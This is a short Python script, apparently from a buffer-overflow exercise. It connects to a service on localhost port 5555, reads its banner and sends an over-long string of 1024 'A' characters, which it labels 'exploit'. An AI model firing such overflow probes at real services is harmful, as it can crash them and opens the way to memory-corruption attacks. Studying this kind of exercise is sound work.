#!/usr/bin/python
import socket

total = 1024

s=socket.socket()
s.connect(("localhost",5555))
print (s.recv(1024))
exploit = "A"*total + "\n"
s.send(exploit)
s.close
